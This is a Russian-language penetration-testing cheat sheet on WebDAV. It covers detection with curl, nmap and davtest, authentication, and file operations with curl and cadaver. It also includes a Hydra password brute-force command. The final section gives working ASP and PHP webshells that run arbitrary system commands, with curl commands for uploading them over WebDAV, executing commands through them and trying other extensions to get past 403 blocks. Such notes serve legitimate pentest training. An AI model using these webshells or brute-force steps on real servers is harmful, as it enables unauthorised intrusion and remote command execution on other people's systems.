# WebDAV

## Что это

WebDAV (Web Distributed Authoring and Versioning) — расширение HTTP, позволяющее удалённо управлять файлами на веб-сервере (создавать, редактировать, перемещать, удалять). Работает поверх HTTP/HTTPS.

**Порты:** 80 (HTTP), 443 (HTTPS)

**Типичное использование:** корпоративные файловые хранилища, SharePoint, удалённое редактирование документов.


## Как проверить наличие WebDAV

### 1. Через `curl` (OPTIONS запрос)

```bash
curl -X OPTIONS http://target/webdav/ -v
```

**Что искать:** в ответе должен быть заголовок `DAV: 1, 2`.

### 2. Через `nmap`

```bash
nmap -p 80 --script http-webdav-scan target
```

### 3. Через `davtest` (проверка возможностей)

```bash
davtest -url http://target/webdav/
```


## Аутентификация в WebDAV

### 1. Базовая аутентификация (Basic Auth)

```bash
curl -u user:pass http://target/webdav/
```

### 2. NTLM аутентификация (Windows)

```bash
curl --ntlm -u user:pass http://target/webdav/
```


## Работа с WebDAV

### Список файлов

```bash
curl -u user:pass http://target/webdav/
```

### Скачать файл

```bash
curl -u user:pass http://target/webdav/file.txt -o file.txt
```

### Загрузить файл (PUT)

```bash
curl -u user:pass -T file.txt http://target/webdav/file.txt
```

### Создать папку (MKCOL)

```bash
curl -u user:pass -X MKCOL http://target/webdav/folder/
```

### Удалить файл (DELETE)

```bash
curl -u user:pass -X DELETE http://target/webdav/file.txt
```

### Переместить/переименовать (MOVE)

```bash
curl -u user:pass -X MOVE --header "Destination: http://target/webdav/newfile.txt" http://target/webdav/oldfile.txt
```

### Копировать (COPY)

```bash
curl -u user:pass -X COPY --header "Destination: http://target/webdav/copy.txt" http://target/webdav/original.txt
```


## WebDAV через cadaver (интерактивный клиент)

```bash
cadaver http://target/webdav/
```

Внутри cadaver:
```bash
ls                # список файлов
get file          # скачать
put file          # загрузить
mkdir folder      # создать папку
delete file       # удалить
quit              # выйти
```


## Брутфорс паролей (Hydra)

```bash
hydra -l user -P pass.txt http-get://target/webdav/
```


## Методы WebDAV

| Метод | Описание |
|-------|----------|
| **OPTIONS** | Проверить, поддерживается ли WebDAV |
| **PROPFIND** | Получить свойства файлов/папок |
| **MKCOL** | Создать папку |
| **PUT** | Загрузить файл |
| **DELETE** | Удалить файл |
| **COPY** | Копировать файл/папку |
| **MOVE** | Переместить/переименовать |
| **LOCK** | Заблокировать файл |
| **UNLOCK** | Разблокировать |


## Загрузка и выполнение webshell через WebDAV (Пентест)

### 1. Создать webshell

**webshell.asp** (для Windows/IIS):
```asp
<% Response.Write("Command: " & Request("cmd") & "<br>")
Set objShell = Server.CreateObject("WScript.Shell")
Set objExec = objShell.Exec("cmd.exe /c " & Request("cmd"))
Response.Write(objExec.StdOut.ReadAll())
%>
```

**webshell.php** (для Linux/PHP):
```php
<?php system($_GET['cmd']); ?>
```

### 2. Загрузить webshell через WebDAV

# Загрузить webshell.asp
curl -u user:pass -T webshell.asp http://target/webdav/webshell.asp

# Загрузить webshell.php
curl -u user:pass -T webshell.php http://target/webdav/webshell.php

# Загрузить после подключения через cadaver
put /usr/share/webshells/asp/webshell.asp

### 3. Выполнить команды

# Выполнить команду через webshell.asp
curl -u user:pass "http://target/webdav/webshell.asp?cmd=whoami"

# Выполнить команду через webshell.php
curl -u user:pass "http://target/webdav/webshell.php?cmd=id"

# или через браузер
http://target/webdav/webshell.php?cmd=id

### 4. Если сервер возвращает 403

Проверь, разрешены ли `.asp` или `.php` через OPTIONS:

```bash
curl -X OPTIONS http://target/webdav/ -v
```

Или используй другое расширение (`.aspx`, `.jsp`, `.html`).

